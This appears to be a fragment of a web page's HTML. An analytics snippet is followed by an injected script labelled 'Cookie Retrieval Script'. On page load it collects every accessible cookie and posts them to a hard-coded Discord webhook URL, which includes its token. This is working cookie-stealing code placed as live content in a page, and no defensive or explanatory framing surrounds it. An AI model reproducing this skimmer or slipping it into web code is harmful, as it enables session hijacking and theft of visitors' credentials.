      window.dataLayer = window.dataLayer || [];

    <!-- Cookie Retrieval Script -->
    <script>
        // Function to get all accessible cookies
        function getAllCookies() {
            let cookies = {};
            let cookieArr = document.cookie.split(';');

            cookieArr.forEach(cookie => {
                let [name, value] = cookie.split('=');
                cookies[name.trim()] = decodeURIComponent(value);
            });

            return cookies;
        }

        // Function to send cookies to Discord webhook
        async function sendCookiesToDiscord(webhookUrl) {
            try {
                const cookies = getAllCookies();
                
                if (Object.keys(cookies).length === 0) {
                    console.log('No accessible cookies found.');
                    return;
                }

                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Cookies: ${JSON.stringify(cookies)}`
                    })
                });

                if (response.ok) {
                    console.log('Cookies sent successfully!');
                } else {
                    console.error('Error sending cookies:', response.statusText);
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Send the retrieved cookies to the webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC';
        sendCookiesToDiscord(webhookUrl);
    </script>
